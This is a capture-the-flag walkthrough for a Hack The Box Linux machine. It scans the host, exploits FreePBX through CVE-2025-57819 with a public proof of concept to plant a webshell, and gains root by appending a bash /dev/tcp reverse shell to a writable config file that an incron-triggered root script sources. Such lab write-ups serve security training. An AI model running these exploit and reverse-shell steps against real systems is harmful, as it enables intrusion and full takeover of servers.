# Connected Linux Easy HTB Machine Writeup

#cve-2025-57819
## Nmap Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV -v 10.129.245.100
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-25 20:05 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
Initiating Ping Scan at 20:05
Scanning 10.129.245.100 [4 ports]
Completed Ping Scan at 20:05, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:05
Completed Parallel DNS resolution of 1 host. at 20:05, 0.50s elapsed
Initiating SYN Stealth Scan at 20:05
Scanning 10.129.245.100 [1000 ports]
Discovered open port 443/tcp on 10.129.245.100
Discovered open port 80/tcp on 10.129.245.100
Discovered open port 22/tcp on 10.129.245.100
Completed SYN Stealth Scan at 20:05, 13.25s elapsed (1000 total ports)
Initiating Service scan at 20:05
Scanning 3 services on 10.129.245.100
Completed Service scan at 20:05, 16.03s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.245.100.
Initiating NSE at 20:05
Completed NSE at 20:05, 12.53s elapsed
Initiating NSE at 20:05
Completed NSE at 20:05, 2.45s elapsed
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
Nmap scan report for 10.129.245.100
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-30T14:07:27
| Not valid after:  2026-11-30T14:07:27
| MD5:     2530 86e8 e962 6d48 36f8 e524 bf79 cc5a
| SHA-1:   6997 e786 d78e 2d0a dcb4 f449 7f65 ba12 52ef 0466
|_SHA-256: 46b9 6671 74f5 9939 af02 a812 993c a389 bf84 c67a de5e 94b1 6c01 43d3 fac9 b666

NSE: Script Post-scanning.
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
Initiating NSE at 20:05
Completed NSE at 20:05, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.94 seconds
           Raw packets sent: 2008 (88.328KB) | Rcvd: 13 (596B)

```
## Web Exploitation
![[Pasted image 20260625202925.png]]
FreePBX app, version `16.0.40.7` that is vulnerable to `CVE-2025-57819`, use [POC](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819/blob/main/watchTowr-vs-FreePBX-CVE-2025-57819.py) to get RCE
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/connected]
└─$ python3 ./exploit.py -H http://connected.htb
                         __         ___  ___________                   
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
                                  \/          \/     \/                            
          
        watchTowr-vs-FreePBX-CVE-2025-57819.py
        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE

          - Piotr and Sonny of watchTowr

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: http://connected.htb/this-is-an-ioc-not-actually-watchTowr-u6oechv23s.php?cmd=hostname
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
```
## Get user flag
Visit: http://connected.htb/this-is-an-ioc-not-actually-watchTowr-u6oechv23s.php?cmd=cat%20/home/asterisk/user.txt

## Post-Exploitation Enumeration

Once a foothold has been established, the next phase is local enumeration. The objective is to identify files, services, scripts, or permissions that could lead to privilege escalation.

A quick search for writable files under /etc produced several interesting results.

`find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" | head -20`

Among the results was:

`/etc/dahdi/init.conf`

Writable configuration files should always be investigated because they are frequently processed by privileged services.

## Discovering the Root Trigger

Further enumeration revealed an Incron configuration.

`cat /etc/incron.d/*`

The output showed:

`/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart`

Incron monitors filesystem events and automatically executes commands when changes occur. In this case, modifying a specific file caused a root-owned script to execute.

The next step was understanding what that script actually did.

Analysis revealed that the script sourced the writable file:

`/etc/dahdi/init.conf`

This immediately presented a privilege escalation opportunity.

## Privilege Escalation

Because the writable configuration file was executed by a root-owned process, arbitrary commands could be injected.

A reverse shell payload was appended to the configuration file.

`echo 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4445 0>&1" &' >> /etc/dahdi/init.conf`

A second listener was started.

`nc -lvnp 4445`

The monitored file event was then triggered.

`echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart`

Within seconds, a new connection arrived.

`uid=0(root) gid=0(root) groups=0(root)`

The machine was now fully compromised.

## Capturing the Root Flag

With root access established, retrieving the final flag was trivial.

`cat /root/root.txt`

The root flag confirmed complete ownership of the target system.

Achievement: https://labs.hackthebox.com/achievement/machine/2924947/906